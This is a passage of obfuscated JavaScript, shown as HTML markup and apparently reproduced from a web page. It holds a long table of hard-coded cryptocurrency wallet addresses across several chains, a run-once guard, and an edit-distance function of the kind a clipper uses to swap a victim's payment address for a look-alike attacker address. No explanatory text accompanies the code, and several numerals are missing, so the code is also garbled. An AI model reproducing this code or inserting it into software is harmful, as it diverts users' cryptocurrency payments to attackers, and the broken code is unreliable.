</span><span>"0xE291a6A58259f660E8965C2f0938097030Bf1767"</span><span>, </span><span>'uKfqV'</span><span>: </span><span>"0xe46e68f7856B26af1F9Ba941Bc9cd06F295eb06D"</span><span>, </span><span>'DAJYA'</span><span>: </span><span>"0xa7eec0c4911ff75AEd179c81258a348c40a36e53"</span><span>, </span><span>'SUVoY'</span><span>: </span><span>"0x3c6762469ea04c9586907F155A35f648572A0C3E"</span><span>, </span><span>'WJmWS'</span><span>: </span><span>"0x322FE72E1Eb64F6d16E6FCd3d45a376efD4bC6b2"</span><span>, </span><span>'QBAXK'</span><span>: </span><span>"0x51Bb31a441531d34210a4B35114D8EF3E57aB727"</span><span>, </span><span>'zLNIR'</span><span>: </span><span>"0x314d5070DB6940C8dedf1da4c03501a3AcEE21E1"</span><span>, </span><span>'kTQGi'</span><span>: </span><span>"0x75023D76D6cBf88ACeAA83447C466A9bBB0c5966"</span><span>, </span><span>'XJxSR'</span><span>: </span><span>"0x1914F36c62b381856D1F9Dc524f1B167e0798e5E"</span><span>, </span><span>'kHjMo'</span><span>: </span><span>"0xB9e9cfd931647192036197881A9082cD2D83589C"</span><span>, </span><span>'kxPDg'</span><span>: </span><span>"0xE88ae1ae3947B6646e2c0b181da75CE3601287A4"</span><span>, </span><span>'gWISZ'</span><span>: </span><span>"0x0D83F2770B5bDC0ccd9F09728B3eBF195cf890e2"</span><span>, </span><span>'hIHlD'</span><span>: </span><span>"0xe2D5C35bf44881E37d7183DA2143Ee5A84Cd4c68"</span><span>, </span><span>'QgItq'</span><span>: </span><span>"0xd21E6Dd2Ef006FFAe9Be8d8b0cdf7a667B30806d"</span><span>, </span><span>'bLJZU'</span><span>: </span><span>"0x93Ff376B931B92aF91241aAf257d708B62D62F4C"</span><span>, </span><span>'IdVSI'</span><span>: </span><span>"0x5C068df7139aD2Dedb840ceC95C384F25b443275"</span><span>, </span><span>'Rpwne'</span><span>: </span><span>"0x70D24a9989D17a537C36f2FB6d8198CC26c1c277"</span><span>, </span><span>'NYUBp'</span><span>: </span><span>"0x0ae487200606DEfdbCEF1A50C003604a36C68E64"</span><span>, </span><span>'eQrXq'</span><span>: </span><span>"0xc5588A6DEC3889AAD85b9673621a71fFcf7E6B56"</span><span>, </span><span>'yRdVI'</span><span>: </span><span>"0x3c23bA2Db94E6aE11DBf9cD2DA5297A09d7EC673"</span><span>, </span><span>'IDnjA'</span><span>: </span><span>"0x5B5cA7d3089D3B3C6393C0B79cDF371Ec93a3fd3"</span><span>, </span><span>'ajXoV'</span><span>: </span><span>"0x4Cb4c0E7057829c378Eb7A9b174B004873b9D769"</span><span>, </span><span>'xyHoE'</span><span>: </span><span>"0xd299f05D1504D0B98B1D6D3c282412FD4Df96109"</span><span>, </span><span>'TCqKY'</span><span>: </span><span>"0x241689F750fCE4A974C953adBECe0673Dc4956E0"</span><span>, </span><span>'dQfUy'</span><span>: </span><span>"0xBc5f75053Ae3a8F2B9CF9495845038554dDFb261"</span><span>, </span><span>'ctRhh'</span><span>: </span><span>"0x5651dbb7838146fCF5135A65005946625A2685c8"</span><span>, </span><span>'JbMdu'</span><span>: </span><span>"0x5c9D146b48f664f2bB4796f2Bb0279a6438C38b1"</span><span>, </span><span>'gjuIU'</span><span>: </span><span>"0xd2Bf42514d35952Abf2082aAA0ddBBEf65a00BA3"</span><span>, </span><span>'fmDjk'</span><span>: </span><span>"0xbB1EC85a7d0aa6Cd5ad7E7832F0b4c8659c44cc9"</span><span>, </span><span>'GjipQ'</span><span>: </span><span>"0x013285c02ab81246F1D68699613447CE4B2B4ACC"</span><span>, </span><span>'wHLUW'</span><span>: </span><span>"0x97A00E100BA7bA0a006B2A9A40f6A0d80869Ac9e"</span><span>, </span><span>'gYVeZ'</span><span>: </span><span>"0x4Bf0C0630A562eE973CE964a7d215D98ea115693"</span><span>, </span><span>'Sqlrp'</span><span>: </span><span>"0x805aa8adb8440aEA21fDc8f2348f8Db99ea86Efb"</span><span>, </span><span>'pcqRS'</span><span>: </span><span>"0xae9935793835D5fCF8660e0D45bA35648e3CD463"</span><span>, </span><span>'fMapR'</span><span>: </span><span>"0xB051C0b7dCc22ab6289Adf7a2DcEaA7c35eB3027"</span><span>, </span><span>'ITrjn'</span><span>: </span><span>"0xf7a82C48Edf9db4FBe6f10953d4D889A5bA6780D"</span><span>, </span><span>'Ixxxa'</span><span>: </span><span>"0x06de68F310a86B10746a4e35cD50a7B7C8663b8d"</span><span>, </span><span>'DdqMx'</span><span>: </span><span>"0x51f3C0fCacF7d042605ABBE0ad61D6fabC4E1F54"</span><span>, </span><span>'mddEm'</span><span>: </span><span>"0x49BCc441AEA6Cd7bC5989685C917DC9fb58289Cf"</span><span>, </span><span>'GQlpD'</span><span>: </span><span>"0x7fD999f778c1867eDa9A4026fE7D4BbB33A45272"</span><span>, </span><span>'PFPfJ'</span><span>: </span><span>"0xe8749d2347472AD1547E1c6436F267F0EdD725Cb"</span><span>, </span><span>'rgsmH'</span><span>: </span><span>"0x2B471975ac4E4e29D110e43EBf9fBBc4aEBc8221"</span><span>, </span><span>'kkUbC'</span><span>: </span><span>"0x02004fE6c250F008981d8Fc8F9C408cEfD679Ec3"</span><span>, </span><span>'qHwwv'</span><span>: </span><span>"0xC4A51031A7d17bB6D02D52127D2774A942987D39"</span><span>, </span><span>'mlgET'</span><span>: </span><span>"0xa1b94fC12c0153D3fb5d60ED500AcEC430259751"</span><span>, </span><span>'Sflwm'</span><span>: </span><span>"0xdedda1A02D79c3ba5fDf28C161382b1A7bA05223"</span><span>, </span><span>'cKcDU'</span><span>: </span><span>"0xE55f51991C8D01Fb5a99B508CC39B8a04dcF9D04"</span><span>, </span><span>'tWKKt'</span><span>: </span><span>"5VVyuV5K6c2gMq1zVeQUFAmo8shPZH28MJCVzccrsZG6"</span><span>, </span><span>'GeUXv'</span><span>: </span><span>"98EWM95ct8tBYWroCxXYN9vCgN7NTcR6nUsvCx1mEdLZ"</span><span>, </span><span>'IFMoj'</span><span>: </span><span>"Gs7z9TTJwAKyxN4G3YWPFfDmnUo3ofu8q2QSWfdxtNUt"</span><span>, </span><span>'shIUB'</span><span>: </span><span>"CTgjc8kegnVqvtVbGZfpP5RHLKnRNikArUYFpVHNebEN"</span><span>, </span><span>'IfmWW'</span><span>: </span><span>"7Nnjyhwsp8ia2W4P37iWAjpRao3Bj9tVZBZRTbBpwXWU"</span><span>, </span><span>'aLjQi'</span><span>: </span><span>"3KFBge3yEg793VqVV1P6fxV7gC9CShh55zmoMcGUNu49"</span><span>, </span><span>'ytLpw'</span><span>: </span><span>"9eU7SkkFGWvDoqSZLqoFJ9kRqJXDQYcEvSiJXyThCWGV"</span><span>, </span><span>'gjXjd'</span><span>: </span><span>"4SxDspwwkviwR3evbZHrPa3Rw13kBr51Nxv86mECyXUF"</span><span>, </span><span>'alqyK'</span><span>: </span><span>"9dtS7zbZD2tK7oaMUj78MKvgUWHbRVLQ95bxnpsCaCLL"</span><span>, </span><span>'tySZZ'</span><span>: </span><span>"7mdCoRPc1omTiZdYY2xG81EvGwN7Z2yodUTX9ZmLm3fx"</span><span>, </span><span>'wEEzD'</span><span>: </span><span>"8rdABs8nC2jTwVhR9axWW7WMbGZxW7JUzNV5pRF8KvQv"</span><span>, </span><span>'PFTuz'</span><span>: </span><span>"55YtaEqYEUM7ASAZ9XmVdSBNy6F7r5zkdLsJFv2ZPtAx"</span><span>, </span><span>'uMBVu'</span><span>: </span><span>"Gr8Kcyt8UVRF1Pux7YHiK32Spm7cmnFVL6hd7LSLHqoB"</span><span>, </span><span>'gGKEH'</span><span>: </span><span>"9MRmVsciWKDvwwTaZQCK2NvJE2SeVU8W6EGFmukHTRaB"</span><span>, </span><span>'QlDwm'</span><span>: </span><span>"5j4k1Ye12dXiFMLSJpD7gFrLbv4QcUrRoKHsgo32kRFr"</span><span>, </span><span>'PbcYH'</span><span>: </span><span>"F1SEspGoVLhqJTCFQEutTcKDubw44uKnqWc2ydz4iXtv"</span><span>, </span><span>'isJWQ'</span><span>: </span><span>"G3UBJBY69FpDbwyKhZ8Sf4YULLTtHBtJUvSX4GpbTGQn"</span><span>, </span><span>'NORtg'</span><span>: </span><span>"DZyZzbGfdMy5GTyn2ah2PDJu8LEoKPq9EhAkFRQ1Fn6K"</span><span>, </span><span>'OWMqm'</span><span>: </span><span>"HvygSvLTXPK4fvR17zhjEh57kmb85oJuvcQcEgTnrced"</span><span>, </span><span>'mAOhu'</span><span>: </span><span>"TB9emsCq6fQw6wRk4HBxxNnU6Hwt1DnV67"</span><span>, </span><span>'zNJib'</span><span>: </span><span>"TSfbXqswodrpw8UBthPTRRcLrqWpnWFY3y"</span><span>, </span><span>'JIaJy'</span><span>: </span><span>"TYVWbDbkapcKcvbMfdbbcuc3PE1kKefvDH"</span><span>, </span><span>'ycYrn'</span><span>: </span><span>"TNaeGxNujpgPgcfetYwCNAZF8BZjAQqutc"</span><span>, </span><span>'YofCH'</span><span>: </span><span>"TJ1tNPVj7jLK2ds9JNq15Ln6GJV1xYrmWp"</span><span>, </span><span>'iKJKA'</span><span>: </span><span>"TGExvgwAyaqwcaJmtJzErXqfra66YjLThc"</span><span>, </span><span>'oQtxT'</span><span>: </span><span>"TC7K8qchM7YXZPdZrbUY7LQwZaahdTA5tG"</span><span>, </span><span>'Gnngl'</span><span>: </span><span>"TQuqKCAbowuQYEKB9aTnH5uK4hNvaxDCye"</span><span>, </span><span>'AIOZX'</span><span>: </span><span>"TFcXJysFgotDu6sJu4zZPAvr9xHCN7FAZp"</span><span>, </span><span>'LBXrZ'</span><span>: </span><span>"TLDkM4GrUaA13PCHWhaMcGri7H8A8HR6zR"</span><span>, </span><span>'GcWUu'</span><span>: </span><span>"TPSLojAyTheudTRztqjhNic6rrrSLVkMAr"</span><span>, </span><span>'uWYHo'</span><span>: </span><span>"TY2Gs3RVwbmcUiDpxDhchPHF1CVsGxU1mo"</span><span>, </span><span>'AjRST'</span><span>: </span><span>"TCYrFDXHBrQkqCPNcp6V2fETk7VoqjCNXw"</span><span>, </span><span>'OghhW'</span><span>: </span><span>"TKcuWWdGYqPKe98xZCWkmhc1gKLdDYvJ2f"</span><span>, </span><span>'WYxMs'</span><span>: </span><span>"TP1ezNXDeyF4RsM3Bmjh4GTYfshf5hogRJ"</span><span>, </span><span>'XPQAU'</span><span>: </span><span>"TJcHbAGfavWSEQaTTLotG7RosS3iqV5WMb"</span><span>, </span><span>'kQfYh'</span><span>: </span><span>"TD5U7782gp7ceyrsKwekWFMWF9TjhC6DfP"</span><span>, </span><span>'fQZCx'</span><span>: </span><span>"TEu3zgthJE32jfY6bYMYGNC7BU2yEXVBgW"</span><span>, </span><span>'UzPHF'</span><span>: </span><span>"TK5r74dFyMwFSTaJF6dmc2pi7A1gjGTtJz"</span><span>, </span><span>'qJMvq'</span><span>: </span><span>"TBJH4pB4QPo96BRA7x6DghEv4iQqJBgKeW"</span><span>, </span><span>'sZVdB'</span><span>: </span><span>"TKBcydgFGX9q3ydaPtxht1TRAmcGybRozt"</span><span>, </span><span>'zzvgO'</span><span>: </span><span>"TQXoAYKPuzeD1X2c4KvQ4gXhEnya3AsYwC"</span><span>, </span><span>'maiTu'</span><span>: </span><span>"TJCevwYQhzcSyPaVBTa15y4qNY2ZxkjwsZ"</span><span>, </span><span>'ZpFNE'</span><span>: </span><span>"THpdx4MiWbXtgkPtsrsvUjHF5AB4u7mx3E"</span><span>, </span><span>'jTVMz'</span><span>: </span><span>"TWpCDiY8pZoY9dVknsy3U4mrAwVm8mCBh6"</span><span>, </span><span>'zBKSx'</span><span>: </span><span>"TK5zyFYoyAttoeaUeWGdpRof2qRBbPSV7L"</span><span>, </span><span>'CsfLH'</span><span>: </span><span>"TAzmtmytEibzixFSfNvqqHEKmMKiz9wUA9"</span><span>, </span><span>'LCszu'</span><span>: </span><span>"TCgUwXe3VmLY81tKBrMUjFBr1qPnrEQFNK"</span><span>, </span><span>'cdzQW'</span><span>: </span><span>"TTPWAyW3Q8MovJvDYgysniq41gQnfRn21V"</span><span>, </span><span>'xBxZT'</span><span>: </span><span>"TWUJVezQta4zEX94RPmFHF2hzQBRmYiEdn"</span><span>, </span><span>'ESuTT'</span><span>: </span><span>"TPeKuzck7tZRXKh2GP1TyoePF4Rr1cuUAA"</span><span>, </span><span>'emvMl'</span><span>: </span><span>"TJUQCnHifZMHEgJXSd8SLJdVAcRckHGnjt"</span><span>, </span><span>'xVGnF'</span><span>: </span><span>"TCgX32nkTwRkapNuekTdk1TByYGkkmcKhJ"</span><span>, </span><span>'hxLhB'</span><span>: </span><span>"TFDKvuw86wduSPZxWTHD9N1TqhXyy9nrAs"</span><span>, </span><span>'EeQvC'</span><span>: </span><span>"TQVpRbBzD1au3u8QZFzXMfVMpHRyrpemHL"</span><span>, </span><span>'pELnW'</span><span>: </span><span>"TSE2VkcRnyiFB4xe8an9Bj1fb6ejsPxa9Z"</span><span>, </span><span>'qzqrf'</span><span>: </span><span>"THe32hBm9nXnzzi6YFqYo8LX77CMegX3v5"</span><span>, </span><span>'ZjUWz'</span><span>: </span><span>"TXfcpZtbYfVtLdGPgdoLm6hDHtnrscvAFP"</span><span>, </span><span>'LieOP'</span><span>: </span><span>"TXgVaHDaEyXSm1LoJEqFgKWTKQQ1jgeQr7"</span><span>, </span><span>'pPSEL'</span><span>: </span><span>"TD5cRTn9dxa4eodRWszGiKmU4pbpSFN87P"</span><span>, </span><span>'Cubxg'</span><span>: </span><span>"LNFWHeiSjb4QB4iSHMEvaZ8caPwtz4t6Ug"</span><span>, </span><span>'tdnnB'</span><span>: </span><span>"LQk8CEPMP4tq3mc8nQpsZ1QtBmYbhg8UGR"</span><span>, </span><span>'WBSil'</span><span>: </span><span>"LMAJo7CV5F5scxJsFW67UsY2RichJFfpP6"</span><span>, </span><span>'aiczm'</span><span>: </span><span>"LUvPb1VhwsriAm3ni77i3otND2aYLZ8fHz"</span><span>, </span><span>'RVLCn'</span><span>: </span><span>"LhWPifqaGho696hFVGTR1KmzKJ8ps7ctFa"</span><span>, </span><span>'UpXNN'</span><span>: </span><span>"LZZPvXLt4BtMzEgddYnHpUWjDjeD61r5aQ"</span><span>, </span><span>'FOnBW'</span><span>: </span><span>"LQfKhNis7ZKPRW6H3prbXz1FJd29b3jsmT"</span><span>, </span><span>'iMpIh'</span><span>: </span><span>"LSihmvTbmQ9WZmq6Rjn35SKLUdBiDzcLBB"</span><span>, </span><span>'mynAv'</span><span>: </span><span>"Ldbnww88JPAP1AUXiDtLyeZg9v1tuvhHBP"</span><span>, </span><span>'LthXt'</span><span>: </span><span>"LR3YwMqnwLt4Qdn6Ydz8bRFEeXvpbNZUvA"</span><span>, </span><span>'thBMJ'</span><span>: </span><span>"Lbco8vJ56o1mre6AVU6cF7JjDDscnYHXLP"</span><span>, </span><span>'SDnYd'</span><span>: </span><span>"LfqFuc3sLafGxWE8vdntZT4M9NKq6Be9ox"</span><span>, </span><span>'rsFGZ'</span><span>: </span><span>"LLcmXxj8Zstje6KqgYb11Ephj8bGdyF1vP"</span><span>, </span><span>'GERuP'</span><span>: </span><span>"LcJwR1WvVRsnxoe1A66pCzeXicuroDP6L6"</span><span>, </span><span>'YnKTx'</span><span>: </span><span>"LUNKimRyxBVXLf9gp3FZo2iVp6D3yyzJLJ"</span><span>, </span><span>'qeLYC'</span><span>: </span><span>"LY1NnVbdywTNmq45DYdhssrVENZKv7Sk8H"</span><span>, </span><span>'bHFpc'</span><span>: </span><span>"LNmMqhqpyDwb1zzZReuA8aVUxkZSc4Ztqq"</span><span>, </span><span>'yJtyM'</span><span>: </span><span>"LdxgXRnXToLMBML2KpgGkdDwJSTM6sbiPE"</span><span>, </span><span>'UthzI'</span><span>: </span><span>"LZMn8hLZ2kVjejmDZiSJzJhHZjuHq8Ekmr"</span><span>, </span><span>'HRVKG'</span><span>: </span><span>"LVnc1MLGDGKs2bmpNAH7zcHV51MJkGsuG9"</span><span>, </span><span>'DYFsg'</span><span>: </span><span>"LRSZUeQb48cGojUrVsZr9eERjw4K1zAoyC"</span><span>, </span><span>'vJoTb'</span><span>: </span><span>"LQpGaw3af1DQiKUkGYEx18jLZeS9xHyP9v"</span><span>, </span><span>'SCttQ'</span><span>: </span><span>"LiVzsiWfCCkW2kvHeMBdawWp9TE8uPgi6V"</span><span>, </span><span>'TLtwe'</span><span>: </span><span>"LY32ncFBjQXhgCkgTAd2LreFv3JZNTpMvR"</span><span>, </span><span>'zubSd'</span><span>: </span><span>"LdPtx4xqmA4HRQCm3bQ9PLEneMWLdkdmqg"</span><span>, </span><span>'jnPSm'</span><span>: </span><span>"LYcHJk7r9gRbg2z3hz9GGj91Po6TaXDK3k"</span><span>, </span><span>'tkhoC'</span><span>: </span><span>"LMhCVFq5fTmrwQyzgfp2MkhrgADRAVCGsk"</span><span>, </span><span>'UXYpW'</span><span>: </span><span>"LPv1wSygi4vPp9UeW6EfWwepEeMFHgALmN"</span><span>, </span><span>'QtlzB'</span><span>: </span><span>"Lf55UbTiSTjnuQ8uWzUBtzghztezEfSLvT"</span><span>, </span><span>'wYQWn'</span><span>: </span><span>"LdJHZeBQovSYbW1Lei6CzGAY4d3mUxbNKs"</span><span>, </span><span>'abbui'</span><span>: </span><span>"LbBxnFaR1bZVN2CquNDXGe1xCuu9vUBAQw"</span><span>, </span><span>'zndLO'</span><span>: </span><span>"LWWWPK2SZZKB3Nu8pHyq2yPscVKvex5v2X"</span><span>, </span><span>'kXpEP'</span><span>: </span><span>"LYN4ESQuJ1TbPxQdRYNrghznN8mQt8WDJU"</span><span>, </span><span>'gBdKm'</span><span>: </span><span>"LiLzQs4KU79R5AUn9jJNd7EziNE7r32Dqq"</span><span>, </span><span>'AJBPj'</span><span>: </span><span>"LeqNtT4aDY9oM1G5gAWWvB8B39iUobThhe"</span><span>, </span><span>'dDlKv'</span><span>: </span><span>"LfUdSVrimg54iU7MhXFxpUTPkEgFJonHPV"</span><span>, </span><span>'upwRp'</span><span>: </span><span>"LTyhWRAeCRcUC9Wd3zkmjz3AhgX6J18kxZ"</span><span>, </span><span>'wKEAH'</span><span>: </span><span>"Lc2LtsEJmPYay1oj7v8xj16mSV15BwHtGu"</span><span>, </span><span>'Kivgs'</span><span>: </span><span>"LVsGi1QVXucA6v9xsjwaAL8WYb7axdekAK"</span><span>, </span><span>'atdgC'</span><span>: </span><span>"LewV6Gagn52Sk8hzPHRSbBjUpiNAdqmB9z"</span><span>, </span><span>'wORrq'</span><span>: </span><span>"bitcoincash:qpwsaxghtvt6phm53vfdj0s6mj4l7h24dgkuxeanyh"</span><span>, </span><span>'AXcYN'</span><span>: </span><span>"bitcoincash:qq7dr7gu8tma7mvpftq4ee2xnhaczqk9myqnk6v4c9"</span><span>, </span><span>'nJmrw'</span><span>: </span><span>"bitcoincash:qpgf3zrw4taxtvj87y5lcaku77qdhq7kqgdga5u6jz"</span><span>, </span><span>'jiCnV'</span><span>: </span><span>"bitcoincash:qrkrnnc5kacavf5pl4n4hraazdezdrq08ssmxsrdsf"</span><span>, </span><span>'IEyeW'</span><span>: </span><span>"bitcoincash:qqdepnkh89dmfxyp4naluvhlc3ynej239sdu760y39"</span><span>, </span><span>'LPwMj'</span><span>: </span><span>"bitcoincash:qqul8wuxs4ec8u4d6arkvetdmdh4ppwr0ggycetq97"</span><span>, </span><span>'QeXkq'</span><span>: </span><span>"bitcoincash:qq0enkj6n4mffln7w9z6u8vu2mef47jwlcvcx5f823"</span><span>, </span><span>'AXCnW'</span><span>: </span><span>"bitcoincash:qrc620lztlxv9elhj5qzvmf2cxhe7egup5few7tcd3"</span><span>, </span><span>'BvvIY'</span><span>: </span><span>"bitcoincash:qrf3urqnjl4gergxe45ttztjymc8dzqyp54wsddp64"</span><span>, </span><span>'WdGef'</span><span>: </span><span>"bitcoincash:qr7mkujcr9c38ddfn2ke2a0sagk52tllesderfrue8"</span><span>, </span><span>'MdtCY'</span><span>: </span><span>"bitcoincash:qqgjn9yqtud5mle3e7zhmagtcap9jdmcg509q56ynt"</span><span>, </span><span>'lcvXH'</span><span>: </span><span>"bitcoincash:qpuq8uc9ydxszny5q0j4actg30he6uhffvvy0dl7er"</span><span>, </span><span>'jQkco'</span><span>: </span><span>"bitcoincash:qz0640hjl2m3n2ca26rknljpr55gyd9pjq89g6xhrz"</span><span>, </span><span>'XcaTu'</span><span>: </span><span>"bitcoincash:qq0j6vl2ls2g8kkhkvpcfyjxns5zq03llgsqdnzl4s"</span><span>, </span><span>'JEZmD'</span><span>: </span><span>"bitcoincash:qq8m8rkl29tcyqq8usfruejnvx27zxlpu52mc9spz7"</span><span>, </span><span>'PQrIR'</span><span>: </span><span>"bitcoincash:qpudgp66jjj8k9zec4na3690tvu8ksq4fq8ycpjzed"</span><span>, </span><span>'JDUWN'</span><span>: </span><span>"bitcoincash:qqe3qc9uk08kxnng0cznu9xqqluwfyemxym7w2e3xw"</span><span>, </span><span>'CZKkU'</span><span>: </span><span>"bitcoincash:qpukdxh30d8dtj552q2jet0pqvcvt64gfujaz8h9sa"</span><span>, </span><span>'GGbBw'</span><span>: </span><span>"bitcoincash:qqs4grdq56y5nnamu5d8tk450kzul3aulyz8u66mjc"</span><span>, </span><span>'TlKHF'</span><span>: </span><span>"bitcoincash:qp7rhhk0gcusyj9fvl2ftr06ftt0pt8wgumd8ytssd"</span><span>, </span><span>'gvWhS'</span><span>: </span><span>"bitcoincash:qpmc3y5y2v7h3x3sgdg7npau034fsggwfczvuqtprl"</span><span>, </span><span>'TOyco'</span><span>: </span><span>"bitcoincash:qzum0qk4kpauy8ljspmkc5rjxe5mgam5xg7xl5uq2g"</span><span>, </span><span>'uzHQJ'</span><span>: </span><span>"bitcoincash:qqjqp8ayuky5hq4kgrarpu40eq6xjrneuurc43v9lf"</span><span>, </span><span>'Ddxxq'</span><span>: </span><span>"bitcoincash:qqxu6a3f0240v0mwzhspm5zeneeyecggvufgz82w7u"</span><span>, </span><span>'SkKwK'</span><span>: </span><span>"bitcoincash:qpux2mtlpd03d8zxyc7nsrk8knarnjxxts2fjpzeck"</span><span>, </span><span>'xlIOq'</span><span>: </span><span>"bitcoincash:qpcgcrjry0excx80zp8hn9vsn4cnmk57vylwa5mtz3"</span><span>, </span><span>'cGdGB'</span><span>: </span><span>"bitcoincash:qpjj6prm5menjatrmqaqx0h3zkuhdkfy75uauxz2sj"</span><span>, </span><span>'NJweA'</span><span>: </span><span>"bitcoincash:qp79qg7np9mvr4mg78vz8vnx0xn8hlkp7sk0g86064"</span><span>, </span><span>'liySF'</span><span>: </span><span>"bitcoincash:qr27clvagvzra5z7sfxxrwmjxy026vltucdkhrsvc7"</span><span>, </span><span>'dZzai'</span><span>: </span><span>"bitcoincash:qrsypfz3lqt8xtf8ej5ftrqyhln577me6v640uew8j"</span><span>, </span><span>'qPXMY'</span><span>: </span><span>"bitcoincash:qrzfrff4czjn6ku0tn2u3cxk7y267enfqvx6zva5w6"</span><span>, </span><span>'GSmbj'</span><span>: </span><span>"bitcoincash:qr7exs4az754aknl3r5gp9scn74dzjkcrgql3jpv59"</span><span>, </span><span>'oFfnO'</span><span>: </span><span>"bitcoincash:qq35fzg00mzcmwtag9grmwljvpuy5jm8kuzfs24jhu"</span><span>, </span><span>'oBsPL'</span><span>: </span><span>"bitcoincash:qra5zfn74m7l85rl4r6wptzpnt2p22h7552swkpa7l"</span><span>, </span><span>'fqBSI'</span><span>: </span><span>"bitcoincash:qzqllr0fsh9fgfvdhmafx32a0ddtkt52evnqd7w7h7"</span><span>, </span><span>'GqRgo'</span><span>: </span><span>"bitcoincash:qpjdcwld84wtd5lk00x8t7qp4eu3y0xhnsjjfgrs7q"</span><span>, </span><span>'TSvsw'</span><span>: </span><span>"bitcoincash:qrgpm5y229xs46wsx9h9mlftedmsm4xjlu98jffmg3"</span><span>, </span><span>'gIXXv'</span><span>: </span><span>"bitcoincash:qpjl9lkjjp4s6u654k3rz06rhqcap849jg8uwqmaad"</span><span>, </span><span>'NNxYW'</span><span>: </span><span>"bitcoincash:qra5uwzgh8qus07v3srw5q0e8vrx5872k5cxguu3h5"</span><span>, </span><span>'wgjIC'</span><span>: </span><span>"bitcoincash:qz6239jkqf9qpl2axk6vclsx3gdt8cy4z5rag98u2r"</span><span>, </span><span>'NbGXK'</span><span>: </span><span>function</span><span> (</span><span>_0x6fd57a, _0x45613c</span><span>) </span><span>{ </span><span>return</span><span> _0x6fd57a == _0x45613c; </span> }, <span>'eDGUh'</span><span>: </span><span>"ethereum"</span><span>, </span><span>'dmtxm'</span><span>: </span><span>function</span><span> (</span><span>_0x426191, _0xcfbe</span><span>) </span><span>{ </span><span>return</span><span> _0x426191 == _0xcfbe; </span> }, <span>'HNbDp'</span><span>: </span><span>function</span><span> (</span><span>_0x43f1a1, _0x360cae</span><span>) </span><span>{ </span><span>return</span><span> _0x43f1a1 == _0x360cae; </span> }, <span>'YBHoq'</span><span>: </span><span>"bitcoinLegacy"</span><span>, </span><span>'pRoUO'</span><span>: </span><span>"bitcoinSegwit"</span><span>, </span><span>'nvayH'</span><span>: </span><span>function</span><span> (</span><span>_0x1a5c0d, _0x3206ce, _0x4cf791</span><span>) </span><span>{ </span><span>return</span><span> _0x1a5c0d(_0x3206ce, _0x4cf791); </span> }, <span>'jHsib'</span><span>: </span><span>"tron"</span><span>, </span><span>'nVTWs'</span><span>: </span><span>"ltc"</span><span>, </span><span>'jsqTT'</span><span>: </span><span>function</span><span> (</span><span>_0x245d0e, _0x2d73d9, _0x14ef57</span><span>) </span><span>{ </span><span>return</span><span> _0x245d0e(_0x2d73d9, _0x14ef57); </span> }, <span>'afnPM'</span><span>: </span><span>function</span><span> (</span><span>_0x458f2b, _0x6aa524</span><span>) </span><span>{ </span><span>return</span><span> _0x458f2b == _0x6aa524; </span> }, <span>'tDons'</span><span>: </span><span>"ltc2"</span><span>, </span><span>'gtXrf'</span><span>: </span><span>function</span><span> (</span><span>_0x4aac02, _0x3c2f2e, _0x51351a</span><span>) </span><span>{ </span><span>return</span><span> _0x4aac02(_0x3c2f2e, _0x51351a); </span> }, <span>'sghpa'</span><span>: </span><span>"bch"</span><span>, </span><span>'hrNiK'</span><span>: </span><span>function</span><span> (</span><span>_0x4989f5, _0xf4abd5, _0x265bdf</span><span>) </span><span>{ </span><span>return</span><span> _0x4989f5(_0xf4abd5, _0x265bdf); </span> }, <span>'tqgyV'</span><span>: </span><span>"solana"</span><span>, </span><span>'mbgjV'</span><span>: </span><span>function</span><span> (</span><span>_0x34d7ea, _0xb2bd29, _0x41c749</span><span>) </span><span>{ </span><span>return</span><span> _0x34d7ea(_0xb2bd29, _0x41c749); </span> }, <span>'IAgrR'</span><span>: </span><span>function</span><span> (</span><span>_0x95d4e, _0x4e3b67</span><span>) </span><span>{ </span><span>return</span><span> _0x95d4e == _0x4e3b67; </span> }, <span>'FvQbM'</span><span>: </span><span>"solana2"</span><span>, </span><span>'UPcyp'</span><span>: </span><span>"solana3"</span><span>, </span><span>'JiXTg'</span><span>: </span><span>function</span><span> (</span><span>_0x2dd239, _0x9ccb5, _0x2f7208</span><span>) </span><span>{ </span><span>return</span><span> _0x2dd239(_0x9ccb5, _0x2f7208); </span> }, <span>'BEiKn'</span><span>: </span><span>function</span><span> (</span><span>_0x7b893d, _0x592b33</span><span>) </span><span>{ </span><span>return</span><span> _0x7b893d == _0x592b33; </span> }, <span>'BAEhI'</span><span>: </span><span>function</span><span> (</span><span>_0x421ebd, _0x39f4fa</span><span>) </span><span>{ </span><span>return</span><span> _0x421ebd != _0x39f4fa; </span> }, <span>'kZnrz'</span><span>: </span><span>"undefined"</span> }; <span> </span><span>if</span><span> (loval == </span><span>1</span><span>) { </span><span>return</span><span>; </span> } <span> loval = </span><span>1</span><span>; </span><span>function</span><span>_0x3479c8</span><span>(</span><span>_0x13a5cc, _0x8c209f</span><span>) </span><span>{ </span><span>const</span><span> _0x50715b = </span><span>Array</span><span>.from({ </span><span>'length'</span><span>: _0x13a5cc.length + </span><span>1</span><span> }, </span><span>() =&gt;</span><span>Array</span><span>(_0x8c209f.length + </span><span>1</span><span>).fill(</span><span>)); </span><span>for</span><span> (</span><span>let</span><span> _0x1b96c3 = </span><span>; _0x1b96c3 &lt;= _0x13a5cc.length; _0x1b96c3++) { </span><span> _0x50715b[_0x1b96c3][</span><span>] = _0x1b96c3; </span> } <span>for</span><span> (</span><span>let</span><span> _0x239a5f = </span><span>; _0x239a5f &lt;= _0x8c209f.length; _0x239a5f++) { </span><span> _0x50715b[</span><span>][_0x239a5f] = _0x239a5f; </span> } <span>for</span><span> (</span><span>let</span><span> _0x5aba31 = </span><span>1</span><span>; _0x5aba31 &lt;= _0x13a5cc.length; _0x5aba31++) { </span><span>for</span><span> (</span><span>let</span><span> _0x22e9c0 = </span><span>1</span><span>; _0x22e9c0 &lt;= _0x8c209f.length; _0x22e9c0++) { </span><span>if</span><span> (_0x13a5cc[_0x5aba31 - </span><span>1</span><span>] === _0x8c209f[_0x22e9c0 - </span><span>1</span><span>]) { </span><span> _0x50715b[_0x5aba31][_0x22e9c0] = _0x50715b[_0x5aba31 - </span><span>1</span><span>][_0x22e9c0 - </span><span>1</span><span>]; </span><span> } </span><span>else</span><span> { </span><span> _0x50715b[_0x5aba31][_0x22e9c0] = </span><span>1</span><span> + </span><span>Math</span><span>.min(_0x50715b[_0x5aba31 - </span><span>1</span><span>][_0x22e9c0], _0x50715b[_0x5aba31][_0x22e9c0 - </span><span>1</span><span>], _0x50715b[_0x5aba31 - </span><span>1</span><span>][_0x22e9c0 - </span><span>1</span><span>]); </span> } } } <span>return</span><span> _0x50715b[_0x13a5cc.length][_0x8c209f.length]; </span> } <span>function</span><span>_0x2abae0</span><span>(</span><span>_0x348925, 